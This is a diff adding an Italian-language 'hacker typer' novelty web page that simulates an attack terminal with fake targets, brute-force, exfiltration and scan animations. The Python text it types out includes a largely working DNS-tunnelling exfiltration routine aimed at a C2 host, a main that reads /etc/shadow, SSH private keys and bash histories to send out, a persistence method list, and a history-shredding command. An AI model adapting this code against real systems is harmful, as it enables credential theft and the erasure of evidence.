+        iv = os.<span class="c-func">urandom</span>(<span class="c-number">12</span>)
+        c  = <span class="c-class">Cipher</span>(<span class="c-class">algorithms</span>.<span class="c-class">AES</span>(<span class="c-keyword">self</span>.key), <span class="c-class">modes</span>.<span class="c-class">GCM</span>(iv))
+        e  = c.<span class="c-func">encryptor</span>()
+        <span class="c-keyword">return</span> iv + e.<span class="c-func">update</span>(data) + e.<span class="c-func">finalize</span>()
+    
+    <span class="c-keyword">def</span> <span class="c-func">via_dns</span>(<span class="c-keyword">self</span>, data: bytes) -> <span class="c-func">int</span>:
+        encrypted = <span class="c-keyword">self</span>.<span class="c-func">_encrypt</span>(data)
+        chunks    = [encrypted[i:i+<span class="c-number">24</span>] <span class="c-keyword">for</span> i <span class="c-keyword">in</span> <span class="c-func">range</span>(<span class="c-number">0</span>, <span class="c-func">len</span>(encrypted), <span class="c-number">24</span>)]
+        
+        <span class="c-keyword">for</span> chunk <span class="c-keyword">in</span> chunks:
+            label = chunk.<span class="c-func">hex</span>()
+            fqdn  = <span class="c-string">f"{label}.x.{self.c2}"</span>
+            <span class="c-keyword">try</span>:
+                socket.<span class="c-func">getaddrinfo</span>(fqdn, <span class="c-class">None</span>)
+                <span class="c-keyword">self</span>.stats[<span class="c-string">'bytes'</span>]   += <span class="c-func">len</span>(chunk)
+                <span class="c-keyword">self</span>.stats[<span class="c-string">'packets'</span>] += <span class="c-number">1</span>
+            <span class="c-keyword">except</span>:
+                <span class="c-keyword">self</span>.stats[<span class="c-string">'errors'</span>] += <span class="c-number">1</span>
+        
+        <span class="c-keyword">return</span> <span class="c-keyword">self</span>.stats[<span class="c-string">'bytes'</span>]
+`,
+`
+<span class="c-keyword">class</span> <span class="c-class">Persistence</span>:
+    <span class="c-comment">"""Meccanismi di persistenza post-exploitation su Linux/Windows."""</span>
+    
+    METHODS_LINUX = [
+        <span class="c-string">"crontab"</span>, <span class="c-string">"systemd_service"</span>, <span class="c-string">"rc.local"</span>, <span class="c-string">"profile.d"</span>,
+        <span class="c-string">"authorized_keys"</span>, <span class="c-string">"ld_preload"</span>, <span class="c-string">"motd.d"</span>, <span class="c-string">"PAM_backdoor"</span>,
+    ]
+    METHODS_WIN = [
+        <span class="c-string">"registry_run"</span>, <span class="c-string">"scheduled_task"</span>, <span class="c-string">"wmi_subscription"</span>,
+        <span class="c-string">"dll_hijack"</span>, <span class="c-string">"lnk_startup"</span>, <span class="c-string">"service_install"</span>,
+    ]
+    
+    <span class="c-keyword">def</span> <span class="c-func">deploy</span>(<span class="c-keyword">self</span>, target_os: <span class="c-func">str</span>, payload_b64: <span class="c-func">str</span>):
+        methods = (
+            <span class="c-keyword">self</span>.<span class="c-class">METHODS_LINUX</span> <span class="c-keyword">if</span> target_os == <span class="c-string">"linux"</span>
+            <span class="c-keyword">else</span> <span class="c-keyword">self</span>.<span class="c-class">METHODS_WIN</span>
+        )
+        results = []
+        <span class="c-keyword">for</span> method <span class="c-keyword">in</span> methods:
+            ok = <span class="c-keyword">self</span>.<span class="c-func">_try_method</span>(method, payload_b64)
+            results.<span class="c-func">append</span>((method, ok))
+            status = <span class="c-string">"OK"</span> <span class="c-keyword">if</span> ok <span class="c-keyword">else</span> <span class="c-string">"SKIP"</span>
+            <span class="c-func">print</span>(<span class="c-string">f"  [{status}] {method}"</span>)
+        installed = <span class="c-func">sum</span>(<span class="c-number">1</span> <span class="c-keyword">for</span> _, ok <span class="c-keyword">in</span> results <span class="c-keyword">if</span> ok)
+        <span class="c-func">print</span>(<span class="c-string">f"[+] {installed}/{len(methods)} metodi persistenza installati"</span>)
+        <span class="c-keyword">return</span> results
+`,
+`
+<span class="c-comment"># === MAIN ===</span>
+<span class="c-keyword">def</span> <span class="c-func">main</span>():
+    <span class="c-func">print</span>(<span class="c-string">"=" * 64</span>)
+    <span class="c-func">print</span>(<span class="c-string">f"  OPERAZIONE CODICE NERO | {time.strftime('%Y-%m-%d %H:%M:%S')}"</span>)
+    <span class="c-func">print</span>(<span class="c-string">"=" * 64</span>)
+    
+    <span class="c-comment"># Fase 1: Ricognizione</span>
+    scanner = <span class="c-class">NetworkScanner</span>(<span class="c-class">TARGET_CONFIG</span>[<span class="c-string">"primary"</span>])
+    ports   = scanner.<span class="c-func">syn_scan</span>(<span class="c-func">range</span>(<span class="c-number">1</span>, <span class="c-number">1024</span>))
+    os_info = scanner.<span class="c-func">os_fingerprint</span>()
+    vulns   = scanner.<span class="c-func">check_vulnerabilities</span>()
+    
+    <span class="c-comment"># Fase 2: Raccolta credenziali</span>
+    harvester = <span class="c-class">CredentialHarvester</span>()
+    creds     = harvester.<span class="c-func">sniff_credentials</span>(<span class="c-string">"eth0"</span>)
+    
+    <span class="c-comment"># Fase 3: Esfiltrazione</span>
+    exfil  = <span class="c-class">DataExfiltrator</span>(<span class="c-class">TARGET_CONFIG</span>[<span class="c-string">"c2_server"</span>], <span class="c-class">TARGET_CONFIG</span>[<span class="c-string">"key_aes"</span>])
+    paths  = [<span class="c-string">"/etc/shadow"</span>, <span class="c-string">"/etc/passwd"</span>, <span class="c-string">"/root/.ssh/id_rsa"</span>,
+              <span class="c-string">"/var/lib/mysql/mysql.sock"</span>, <span class="c-string">"/home/*/.bash_history"</span>]
+    <span class="c-keyword">for</span> p <span class="c-keyword">in</span> paths:
+        data = <span class="c-func">open</span>(p, <span class="c-string">"rb"</span>).<span class="c-func">read</span>()
+        sent = exfil.<span class="c-func">via_dns</span>(data)
+        <span class="c-func">print</span>(<span class="c-string">f"[+] {p} → {sent/1024:.1f} KB trasferiti"</span>)
+    
+    <span class="c-comment"># Fase 4: Persistenza</span>
+    pers = <span class="c-class">Persistence</span>()
+    pers.<span class="c-func">deploy</span>(<span class="c-string">"linux"</span>, payload_b64=base64.<span class="c-func">b64encode</span>(os.<span class="c-func">urandom</span>(<span class="c-number">256</span>)).<span class="c-func">decode</span>())
+    
+    <span class="c-func">print</span>(<span class="c-string">"\\n[+] Operazione completata. Eliminazione tracce..."</span>)
+    os.<span class="c-func">system</span>(<span class="c-string">"history -c && shred -u ~/.bash_history"</span>)
+
+
+<span class="c-keyword">if</span> __name__ == <span class="c-string">"__main__"</span>:
+    <span class="c-func">main</span>()
+`
+];
+
+// =============================================
+// STATO
+// =============================================
+let segIdx = 0, charIdx = 0;
+let totalBytes = 0, packets = 0, vulns = 0, lineCount = 1;
+let matrixActive = false, matrixRaf = null;
+
+function rnd(a,b){ return Math.floor(Math.random()*(b-a+1))+a; }
+function hex(n){ return Math.floor(Math.random()*Math.pow(16,n)).toString(16).padStart(n,'0').toUpperCase(); }
+function randIp(){ return `${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}`; }
+function fmtBytes(b){
+  if(b>1048576) return (b/1048576).toFixed(1)+' MB';
+  if(b>1024) return (b/1024).toFixed(1)+' KB';
+  return b+' B';
+}
+
+// Clock
+function clock(){
+  document.getElementById('tb-clock').textContent = new Date().toTimeString().slice(0,8);
+}
+setInterval(clock,1000); clock();
+
+// IP
+document.getElementById('tb-ip').textContent = randIp();
+
+// =============================================
+// OUTPUT TERMINALE
+// =============================================
+const out = document.getElementById('output');
+const CHARS_PER_STROKE = 4;
+
+function typeChars(n) {
+  const seg = segments[segIdx];
+  const chunk = seg.slice(charIdx, charIdx + n*8); // html chars
+  charIdx += n*8;
+  
+  if(charIdx >= seg.length) {
+    charIdx = 0;
+    segIdx = (segIdx+1) % segments.length;
+  }
+  
+  out.innerHTML += chunk;
+  
+  // Conta newlines per line counter
+  const nl = (chunk.match(/\n/g)||[]).length;
+  lineCount += nl;
+  document.getElementById('line-count').textContent = lineCount;
+  
+  // Bytes (stima testo visibile ~40% dei char HTML)
+  totalBytes += Math.floor(chunk.replace(/<[^>]+>/g,'').length);
+  
+  // Aggiorna counters
+  packets += rnd(1,8);
+  document.getElementById('byte-counter').textContent = fmtBytes(totalBytes);
+  document.getElementById('sb-bytes').textContent = fmtBytes(totalBytes)+' scritti';
+  document.getElementById('sb-pkts').textContent = packets.toLocaleString('it')+' pacchetti';
+  
+  out.scrollTop = out.scrollHeight;
+  
+  // Suono tasto
+  try {
+    const ctx = new (window.AudioContext||window.webkitAudioContext)();
+    const o=ctx.createOscillator(), g=ctx.createGain();
+    o.connect(g); g.connect(ctx.destination);
+    o.frequency.value = rnd(180,500);
+    o.type = 'square';
+    g.gain.setValueAtTime(0.04,ctx.currentTime);
+    g.gain.exponentialRampToValueAtTime(.001,ctx.currentTime+.03);
+    o.start(); o.stop(ctx.currentTime+.03);
+  }catch(e){}
+}
+
+// Intro
+(function(){
+  const intro = [
+    `<span class="c-dim">╔══════════════════════════════════════════════════════════════╗</span>\n`,
+    `<span class="c-dim">║</span>  <span class="c-ok">SHADOWOPS TERMINAL</span>  <span class="c-dim">·</span>  <span class="c-comment">sessione cifrata  ·  tor #amsterdam_7</span>    <span class="c-dim">║</span>\n`,
+    `<span class="c-dim">╚══════════════════════════════════════════════════════════════╝</span>\n\n`,
+    `<span class="c-prompt">root@shadow</span><span class="c-dim">:</span><span style="color:var(--purple)">~/operazioni/codice-nero</span><span class="c-dim">$</span> python3 main.py\n\n`,
+  ];
+  let i=0;
+  const iv = setInterval(()=>{
+    if(i>=intro.length){clearInterval(iv);return;}
+    out.innerHTML += intro[i++];
+    out.scrollTop = out.scrollHeight;
+  },300);
+})();
+
+// =============================================
+// PANNELLO SINISTRA: Targets
+// =============================================
+const targets = Array.from({length:8},()=>({
+  ip: randIp(),
+  host: ['server-dc1','web-prod','db-master','mail','vpn-gw','api-node','auth-srv','backup'][rnd(0,7)],
+  state: ['APERTO','APERTO','IN SCAN','COMPROMESSO','FILTRATO'][rnd(0,4)],
+}));
+
+function renderTargets(){
+  const el = document.getElementById('target-list');
+  el.innerHTML = targets.map(t=>{
+    const cls = t.state==='COMPROMESSO'?'active':t.state==='FILTRATO'?'':''
+    const dot = t.state==='APERTO'||t.state==='COMPROMESSO'?'dot-green':
+                t.state==='IN SCAN'?'dot-orange':
+                t.state==='FILTRATO'?'dot-red':'dot-gray';
+    return `<div class="sl-item ${cls}">
+      <div class="sl-dot ${dot}"></div>
+      <div>
+        <div style="font-size:11px">${t.host}</div>
+        <div style="font-size:10px;color:var(--text3);font-family:'JetBrains Mono',monospace">${t.ip}</div>
+      </div>
+      <div class="sl-item-right">${t.state}</div>
+    </div>`;
+  }).join('');
+}
+renderTargets();
+setInterval(()=>{
+  const t=targets[rnd(0,targets.length-1)];
+  t.state=['APERTO','APERTO','IN SCAN','COMPROMESSO','FILTRATO'][rnd(0,4)];
+  renderTargets();
+},2000);
+
+// =============================================
+// SESSIONI
+// =============================================
+const sessions = [
+  {host:'root@192.168.100.50', proto:'SSH-2.0', enc:'aes256-ctr', dur:'00:12:34'},
+  {host:'http://10.10.14.22',  proto:'HTTP/1.1', enc:'TLS1.3',    dur:'00:03:11'},
+  {host:'pivot@172.16.0.1',    proto:'SOCKS5',  enc:'chacha20',  dur:'00:01:55'},
+];
+function renderSessions(){
+  document.getElementById('sessions-list').innerHTML = sessions.map(s=>`
+    <div class="sl-item">
+      <div class="sl-dot dot-green"></div>
+      <div>
+        <div style="font-size:10px">${s.host}</div>
+        <div style="font-size:9px;color:var(--text3)">${s.proto} · ${s.enc}</div>
+      </div>
+      <div class="sl-item-right">${s.dur}</div>
+    </div>
+  `).join('');
+}
+renderSessions();
+
+// =============================================
+// METRICHE CPU/RAM/NET
+// =============================================
+function updateMetrics(){
+  const cpu=rnd(55,97), ram=rnd(40,80), net=rnd(10,100);
+  document.getElementById('cpu-val').textContent=cpu+'%';
+  document.getElementById('cpu-bar').style.width=cpu+'%';
+  document.getElementById('ram-val').textContent=ram+'%';
+  document.getElementById('ram-bar').style.width=ram+'%';
+  document.getElementById('net-val').textContent=rnd(50,2000)+' KB/s';
+  document.getElementById('net-bar').style.width=net+'%';
+}
+updateMetrics();
+setInterval(updateMetrics, 700);
+
+// Mini sparkline
+const mcEl = document.getElementById('mini-chart');
+for(let i=0;i<12;i++){
+  const b=document.createElement('div');
+  b.className='mc-bar'+(Math.random()>.5?' hi':'');
+  b.style.height=rnd(4,28)+'px';
+  mcEl.appendChild(b);
+}
+setInterval(()=>{
+  const bars=mcEl.querySelectorAll('.mc-bar');
+  bars.forEach(b=>{ b.style.height=rnd(4,28)+'px'; });
+},600);
+
+// =============================================
+// PORTE PANNELLO DESTRA
+// =============================================
+const ports = [
+  {port:22, svc:'ssh',     state:'open',   version:'OpenSSH 9.2'},
+  {port:80, svc:'http',    state:'open',   version:'Apache 2.4.57'},
+  {port:443,svc:'https',   state:'open',   version:'nginx 1.24'},
+  {port:445,svc:'smb',     state:'open',   version:'Samba 4.17'},
+  {port:3306,svc:'mysql',  state:'filtered',version:'MySQL 8.0'},
+  {port:3389,svc:'rdp',    state:'open',   version:'MS-TS 10.0'},
+  {port:8080,svc:'http-alt',state:'closed', version:'Tomcat 9'},
+];
+function renderPorts(){
+  document.getElementById('port-list').innerHTML = ports.map(p=>{
+    const ns=p.state==='open'?'ns-open':p.state==='filtered'?'ns-filter':'ns-closed';
+    return `<div class="net-item">
+      <div>
+        <div class="net-ip">${p.port}/${p.svc}</div>
+        <div class="net-port">${p.version}</div>
+      </div>
+      <div class="net-status ${ns}">${p.state}</div>
+    </div>`;
+  }).join('');
+}
+renderPorts();
+
+// =============================================
+// GRAFICO TRAFFICO
+// =============================================
+const tgraph = document.getElementById('traffic-graph');
+for(let i=0;i<20;i++){
+  const col=document.createElement('div'); col.className='g-col';
+  const h1=document.createElement('div'); h1.className='g-seg';
+  h1.style.height=rnd(4,40)+'px'; h1.style.background='rgba(88,166,255,.4)';
+  const h2=document.createElement('div'); h2.className='g-seg';
+  h2.style.height=rnd(2,20)+'px'; h2.style.background='rgba(63,185,80,.4)';
+  col.appendChild(h1); col.appendChild(h2);
+  tgraph.appendChild(col);
+}
+setInterval(()=>{
+  tgraph.querySelectorAll('.g-col').forEach(col=>{
+    const segs=col.querySelectorAll('.g-seg');
+    segs[0].style.height=rnd(4,50)+'px';
+    segs[1].style.height=rnd(2,25)+'px';
+  });
+},400);
+
+// =============================================
+// LOG STREAM
+// =============================================
+const logMsgs=[
+  ['info','connessione TOR stabilita'],
+  ['ok',  'autenticazione SSH riuscita'],
+  ['warn','firewall rilevato su porta 8080'],
+  ['info','SYN scan completato: 7 porte'],
+  ['ok',  'payload caricato in memoria'],
+  ['warn','IDS attivo — rallentamento scan'],
+  ['ok',  'hash MD5 crackato in 2.3s'],
+  ['info','DNS tunneling attivo'],
+  ['ok',  'persistenza crontab installata'],
+  ['err', 'timeout su 192.168.1.100'],
+  ['info','esfiltrazione in corso...'],
+  ['ok',  'tracce eliminate: OK'],
+];
+function addLog(){
+  const ls=document.getElementById('log-stream');
+  const [t,m]=logMsgs[rnd(0,logMsgs.length-1)];
+  const ts=new Date().toTimeString().slice(0,8);
+  ls.innerHTML+=`<div class="log-${t}">[${ts}] ${m}</div>`;
+  while(ls.children.length>12) ls.removeChild(ls.firstChild);
+}
+setInterval(addLog, 1200);
+
+// =============================================
+// NOTIFICA
+// =============================================
+function notify(title, body, type='green', icon='✓'){
+  const el=document.createElement('div');
+  el.className=`notif-card ${type}`;
+  el.innerHTML=`
+    <div class="notif-head">
+      <span class="notif-icon">${icon}</span>
+      <span class="notif-title">${title}</span>
+    </div>
+    <div class="notif-body">${body}</div>
+  `;
+  document.getElementById('notif').appendChild(el);
+  setTimeout(()=>{
+    el.classList.add('fade-out');
+    setTimeout(()=>el.remove(),300);
+  },3500);
+}
+
+// =============================================
+// MODAL
+// =============================================
+function showModal(icon,title,rows, progressLabel=null){
+  document.getElementById('modal-icon').textContent=icon;
+  document.getElementById('modal-title').textContent=title;
+  
+  let html = rows.map(([k,v,cls])=>`
+    <div class="modal-row">
+      <span class="modal-key">${k}</span>
+      <span class="modal-val ${cls||''}">${v}</span>
+    </div>
+  `).join('');
+  
+  if(progressLabel){
+    html+=`<div class="modal-progress-wrap">
+      <div class="mp-label"><span>${progressLabel}</span><span id="mp-pct">0%</span></div>
+      <div class="mp-track"><div class="mp-fill" id="mp-fill"></div></div>
+    </div>`;
+  }
+  
+  document.getElementById('modal-body').innerHTML=html;
+  document.getElementById('modal-bg').classList.add('show');
+}
+function closeModal(){
+  document.getElementById('modal-bg').classList.remove('show');
+}
+document.getElementById('modal-bg').addEventListener('click',closeModal);
+
+// =============================================
+// EFFETTI TASTI FUNZIONE
+// =============================================
+
+function f1_accesso(){
+  vulns++;
+  showModal('🔐','Autenticazione completata',[
+    ['Obiettivo',     randIp()+':22', 'green'],
+    ['Utente',        'root', 'green'],
+    ['Metodo',        'RSA-4096', ''],
+    ['Tentativi',     '1', 'green'],
+    ['Sessione',      hex(8).toLowerCase(), 'blue'],
+    ['Cifratura',     'aes256-ctr hmac-sha2-512', ''],
+    ['Stato',         'SHELL ROOT ATTIVA', 'green'],
+  ]);
+  setTimeout(closeModal,3000);
+  notify('Accesso garantito','root@'+randIp()+' — shell ottenuta','green','🔓');
+  out.innerHTML+=`\n<span class="c-ok">[+] autenticazione superata — shell root attiva</span>\n`;
+  out.scrollTop=out.scrollHeight;
+  beepSeq([[440,.08,0],[554,.08,100],[660,.08,200],[880,.2,320]]);
+  document.getElementById('sb-vuln').textContent=vulns+' vulnerabilità';
+}
+
+function f2_matrix(){
+  const cv=document.getElementById('matrix-canvas');
+  if(matrixActive){
+    cv.classList.remove('show');
+    matrixActive=false;
+    if(matrixRaf)cancelAnimationFrame(matrixRaf);
+    return;
+  }
+  matrixActive=true;
+  cv.width=window.innerWidth; cv.height=window.innerHeight;
+  cv.classList.add('show');
+  const ctx=cv.getContext('2d');
+  const W=cv.width, H=cv.height;
+  const cols=Math.floor(W/14);
+  const drops=Array(cols).fill(0);
+  const chars='アイウエオカキクケコabcdef0123456789!@#$%^&*()+=-_[]{}|;:\',.<>?/\\`~'.split('');
+  function draw(){
+    ctx.fillStyle='rgba(10,12,15,0.1)';
+    ctx.fillRect(0,0,W,H);
+    cols_arr: for(let i=0;i<cols;i++){
+      const ch=chars[rnd(0,chars.length-1)];
+      const y=drops[i]*14;
+      if(Math.random()>.92){ ctx.fillStyle='#e6edf3'; }
+      else { ctx.fillStyle='#3fb950'; }
+      ctx.font='13px JetBrains Mono, monospace';
+      ctx.fillText(ch,i*14,y);
+      if(y>H&&Math.random()>.975) drops[i]=0;
+      drops[i]++;
+    }
+    matrixRaf=requestAnimationFrame(draw);
+  }
+  draw();
+  notify('Matrix rain','visualizzazione attiva — premi F2 per disattivare','blue','🟩');
+}
+
+function f3_crack(){
+  const pwd = ['p','a','s','s','w','0','r','d'].join('');
+  const charset='abcdefghijklmnopqrstuvwxyz0123456789!@#$';
+  showModal('🔑','Brute-force in corso',[
+    ['Target hash', '5f4dcc3b5aa765d61d8327d...', ''],
+    ['Algoritmo',   'MD5 (rainbow+dict hybrid)', ''],
+    ['Wordlist',    'rockyou.txt · 14.8M voci', ''],
+    ['Velocità',    '28.4M hash/s', 'blue'],
+    ['Stato',       'IN CORSO...', 'orange'],
+  ], 'Avanzamento crack');
+  
+  let p=0;
+  const iv=setInterval(()=>{
+    p+=rnd(1,3); if(p>100)p=100;
+    document.getElementById('mp-pct').textContent=p+'%';
+    document.getElementById('mp-fill').style.width=p+'%';
+    
+    let guess='';
+    for(let i=0;i<8;i++){
+      guess+= p>(i*12.5) ? pwd[i] : charset[rnd(0,charset.length-1)];
+    }
+    
+    // Aggiorna "Stato" in modal
+    const rows=document.querySelectorAll('.modal-val');
+    if(rows[4]) rows[4].textContent = p<100?guess:'TROVATA: '+pwd;
+    
+    if(p>=100){
+      clearInterval(iv);
+      rows[4].textContent='TROVATA: '+pwd;
+      rows[4].className='modal-val green';
+      vulns++;
+      document.getElementById('sb-vuln').textContent=vulns+' vulnerabilità';
+      beepSeq([[660,.1,0],[880,.1,120],[1100,.25,260]]);
+      notify('Password violata','hash MD5 → "'+pwd+'" — 14.8M tentativi','orange','🔑');
+      setTimeout(closeModal,3000);
+    }
+  },70);
+  beepSeq([[200,.1,0],[300,.1,100]]);
+}
+
+function f4_esfiltra(){
+  const files=[
+    ['/etc/shadow',       rnd(2,8)+' KB'],
+    ['/etc/passwd',       rnd(1,4)+' KB'],
+    ['/root/.ssh/id_rsa', rnd(3,5)+' KB'],
+    ['/var/mail/root',    rnd(10,80)+' KB'],
+    ['/var/lib/mysql/',   rnd(200,800)+' KB'],
+    ['/home/*/.bash_history', rnd(5,30)+' KB'],
+  ];
+  let i=0;
+  showModal('📤','Esfiltrazione dati',[
+    ['Canale',      'DNS tunneling over TOR', ''],
+    ['C&C server',  '7f3a9c21.onion', 'blue'],
+    ['Cifratura',   'AES-256-GCM', ''],
+    ['File target', files.length+' percorsi', 'orange'],
+    ['Stato',       'IN CORSO...', 'orange'],
+  ], 'Trasferimento');
+  
+  let p=0;
+  const iv=setInterval(()=>{
+    p+=rnd(1,4); if(p>100)p=100;
+    document.getElementById('mp-pct').textContent=p+'%';
+    document.getElementById('mp-fill').style.width=p+'%';
+    document.getElementById('mp-fill').style.background='var(--orange)';
+    
+    const fileIdx=Math.floor(p/100*files.length);
+    if(fileIdx<files.length){
+      const rows=document.querySelectorAll('.modal-val');
+      if(rows[4]) rows[4].textContent=files[fileIdx][0];
+      out.innerHTML+=`<span class="c-warn">[TX] ${files[fileIdx][0]} → ${files[fileIdx][1]}</span>\n`;
+      out.scrollTop=out.scrollHeight;
+    }
+    
+    if(p>=100){
+      clearInterval(iv);
+      const rows=document.querySelectorAll('.modal-val');
+      if(rows[4]){rows[4].textContent='COMPLETATA';rows[4].className='modal-val green';}
+      beepSeq([[440,.1,0],[660,.15,150],[880,.2,330]]);
+      notify('Esfiltrazione completa',files.reduce((a,[_,s])=>a+' '+s,'')+' inviati al C&C','blue','📤');
+      setTimeout(closeModal,2500);
+    }
+  },80);
+}
+
+function f5_scan(){
+  vulns++;
+  document.getElementById('sb-vuln').textContent=vulns+' vulnerabilità';
+  const newIp=randIp();
+  showModal('🔍','Port scan completato',[
+    ['Obiettivo',   newIp, ''],
+    ['Tipo scan',   'SYN stealth -sS -T4 -O', ''],
+    ['Porte totali','65535', ''],
+    ['Porte aperte', rnd(3,12)+'', 'green'],
+    ['OS rilevato', 'Linux 5.15 (Ubuntu 22.04)', 'blue'],
+    ['CVE trovate', rnd(2,7)+' vulnerabilità critiche', 'orange'],
+  ]);
+  setTimeout(closeModal,3000);
+  notify('Scan completato',newIp+' — '+rnd(3,12)+' porte aperte, '+rnd(1,5)+' CVE critiche','orange','🔍');
+  beepSeq([[300,.06,0],[400,.06,80],[500,.06,160],[600,.12,240]]);
+  // aggiungi ip alla lista targets
+  targets.push({ip:newIp,host:'target-'+rnd(10,99),state:'APERTO'});
+  if(targets.length>10)targets.shift();
+  renderTargets();
+}
+
+function esc_panic(){
+  closeModal();
+  if(matrixActive)f2_matrix();
+  document.getElementById('notif').innerHTML='';
+  out.innerHTML+=`\n<span class="c-err">[PANIC] sessione terminata — connessione chiusa — log eliminati</span>\n`;
+  out.innerHTML+=`<span class="c-dim">[sys] shred -u ~/.bash_history && history -c</span>\n`;
+  out.innerHTML+=`<span class="c-dim">[sys] tor —kill</span>\n`;
+  out.scrollTop=out.scrollHeight;
+  notify('Panic mode','sessione chiusa, log eliminati, TOR terminato','red','⚠');
+  beepSeq([[440,.1,0],[330,.1,120],[220,.2,240]]);
+}
+
+// =============================================
+// SUONI
+// =============================================
+function beepSeq(notes){
+  notes.forEach(([f,d,delay])=>{
+    setTimeout(()=>{
+      try{
+        const c=new (window.AudioContext||window.webkitAudioContext)();
+        const o=c.createOscillator(), g=c.createGain();
+        o.connect(g);g.connect(c.destination);
+        o.frequency.value=f;o.type='sine';
+        g.gain.setValueAtTime(0.08,c.currentTime);
+        g.gain.exponentialRampToValueAtTime(.001,c.currentTime+d);
+        o.start();o.stop(c.currentTime+d);
+      }catch(e){}
+    },delay);
+  });
+}
+
+// =============================================
+// TASTIERA
+// =============================================
+document.addEventListener('keydown',e=>{
+  if(['F1','F2','F3','F4','F5','F6','Escape'].includes(e.key))e.preventDefault();
+  switch(e.key){
+    case 'F1': f1_accesso(); break;
+    case 'F2': f2_matrix(); break;
+    case 'F3': f3_crack(); break;
+    case 'F4': f4_esfiltra(); break;
+    case 'F5': f5_scan(); break;
+    case 'Escape': esc_panic(); break;
+    case 'Enter':
+      out.innerHTML+=`\n<span class="c-prompt">root@shadow</span><span class="c-dim">:</span><span style="color:var(--purple)">~/operazioni/codice-nero</span><span class="c-dim">$</span> `;
+      out.scrollTop=out.scrollHeight;
+      lineCount++;
+      document.getElementById('line-count').textContent=lineCount;
+      try{
+        const c=new (window.AudioContext||window.webkitAudioContext)();
+        const o=c.createOscillator(),g=c.createGain();
+        o.connect(g);g.connect(c.destination);
+        o.frequency.value=300;g.gain.setValueAtTime(.06,c.currentTime);
+        g.gain.exponentialRampToValueAtTime(.001,c.currentTime+.08);
+        o.start();o.stop(c.currentTime+.1);
+      }catch(e){}
+      break;
+    case 'Backspace':
+      // Rimuovi ultimo char visibile
+      const t=out.innerHTML;
+      out.innerHTML=t.slice(0,-1);
+      break;
+    default:
+      typeChars(CHARS_PER_STROKE);
+  }
+});
+
+// Resize matrix
+window.addEventListener('resize',()=>{
+  if(matrixActive){
+    const cv=document.getElementById('matrix-canvas');
+    cv.width=window.innerWidth;cv.height=window.innerHeight;
+  }
+});
+
+// Notifica benvenuto
+setTimeout(()=>{
+  notify('Sessione avviata','tor #amsterdam_7 · aes-256-gcm · nessuna traccia registrata','green','🟢');
+},800);
+</script>
+</body>
+</html>
